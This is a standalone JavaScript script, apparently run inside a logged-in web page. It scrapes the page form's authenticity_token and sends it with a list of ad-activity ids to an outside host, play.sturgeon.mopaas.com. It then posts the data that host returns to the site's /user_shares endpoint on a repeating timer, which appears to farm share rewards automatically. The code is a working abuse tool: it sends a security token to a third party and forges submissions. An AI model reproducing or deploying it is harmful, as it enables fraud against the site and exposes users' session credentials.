var iInterval = 750;
function calcTime(offset) {
d = new Date();
utc = d.getTime() + (d.getTimezoneOffset() * 60000);
nd = new Date(utc + (3600000*offset));
return nd.toLocaleString();
}
function ssend(xdata) {
	try {
		var zf = JSON.parse(xdata);
	} catch(e) {
		alert('Send Failed! ' + xdata);
		return false;
	}
	document.getElementById('status').innerHTML = 'Status: Sending ' + zf['data'];
	if (xdata) {
		alert('Sending... ' + xdata);

		$.ajax({
			type: "POST",
			dataType: "json",
			url: '/user_shares',
			data: xdata,
			success: function(e) {
				e.error ? ((alert(zf['id'] + " Send Failed!"))+(document.getElementById('status').innerHTML += '<br/>Result: ' +calcTime('+8')+' ' + zf['id'] + ' error ' + (e.error))) : ((alert(zf['id'] + " Send Success!"))+(document.getElementById('status').innerHTML += '<br/>Result: '+calcTime('+8')+' ' + zf['id'] + ' success ' + (e.success)));
				document.getElementById('leftv').innerHTML = iInterval;
			},
			error: function() {
			document.getElementById('status').innerHTML += '<br/>' + 'Result: ' +calcTime('+8')+' ' + zf['id']+ " Send Failed!";
				alert(zf['id'] + " Send Failed!");
			}
		});

	}
}
function getkey(code){
var code=((code).match(/authenticity_token(\=.*\&+)user_share\%5Bad\_activity\_id/ig));
return (code[0].trim().replace(/authenticity\_token\=/ig,"").replace(/&user_share\%5Bad\_activity\_id/ig,""));
}
var data = $(document.getElementsByTagName('form')[0]).closest("form").serialize();
var ids=Array("4332","4333","4683","10486","20372","60715");
var key=getkey(data);
var runnow=0;
function runxs() {

try{
	CrossScript('http://play.sturgeon.mopaas.com/ajax.php', 'http://play.sturgeon.mopaas.com/wlgs/index.php?key='+key+'&id=' + ids[runnow], '', 'ajax_get_data_'+runnow, "if(ajax_get_data_"+runnow+"){var results=ajax_get_data_"+runnow+";ssend(results);if((runnow+1)<ids.length){runnow=runnow+1;runxs();}else{runnow=0;}}");
}catch(e){alert(e);}

}
function runone() {
document.getElementById('ldate').innerHTML=calcTime('+8');
	var srs = document.getElementById('leftv').innerHTML;
	if (srs > 0) {
		document.getElementById('leftv').innerHTML -= 1;
	} else {
		document.getElementById('leftv').innerHTML = 120;
		runnow=0;
		runxs();
	}
}
function prerun() {
	document.getElementById('status').innerHTML = 'Status:' + 'Starting...';
	ddata = iInterval;
	alert('Interval ' + ddata);
runnow=0;
	runxs();
	document.getElementById('leftv').innerHTML = ddata;
	setInterval('runone()', 1000);
}

document.body.innerHTML = ('<span style="float:right;top:0;right:0;" id="leftv"></span><div id="status"></div><span style="position:fixed;float:right;bottom:0;right:0;" id="ldate"></span>');
document.getElementById('status').innerHTML = 'Status:' + 'Preparing...';
prerun();